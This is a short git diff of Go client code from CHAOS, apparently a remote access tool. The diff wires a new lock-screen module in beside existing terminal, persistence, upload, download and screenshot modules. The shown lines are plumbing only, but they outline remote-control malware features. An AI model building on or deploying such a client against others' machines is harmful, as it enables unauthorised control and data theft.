@@ -7,6 +7,7 @@ import (
 	"github.com/tiagorlampert/CHAOS/client/app/usecase"
 	"github.com/tiagorlampert/CHAOS/client/app/usecase/download"
 	"github.com/tiagorlampert/CHAOS/client/app/usecase/information"
+	"github.com/tiagorlampert/CHAOS/client/app/usecase/lock_screen"
 	"github.com/tiagorlampert/CHAOS/client/app/usecase/open_url"
 	"github.com/tiagorlampert/CHAOS/client/app/usecase/persistence"
 	"github.com/tiagorlampert/CHAOS/client/app/usecase/screenshot"
@@ -33,7 +34,8 @@ func NewApp(address, port string) (*App, error) {
 	uploadUseCase := upload.NewUploadUseCase(conn)
 	terminalUseCase := terminal.NewTerminalUseCase(conn)
 	persistenceUseCase := persistence.NewPersistenceUseCase(conn)
-	urlUseCase := open_url.NewOpenURLUseCase(conn)
+	openURLUseCase := open_url.NewOpenURLUseCase(conn)
+	screnUseCase := lock_screen.NewLockScrenUseCase(conn)
 
 	useCase := usecase.UseCase{
 		Information: informationUseCase,
@@ -42,7 +44,8 @@ func NewApp(address, port string) (*App, error) {
 		Upload:      uploadUseCase,
 		Terminal:    terminalUseCase,
 		Persistence: persistenceUseCase,
-		OpenURL:     urlUseCase,
+		OpenURL:     openURLUseCase,
+		LockScreen:  screnUseCase,
 	}
 
 	connectionHandler := connection.NewConnectionHandler(conn, &useCase)
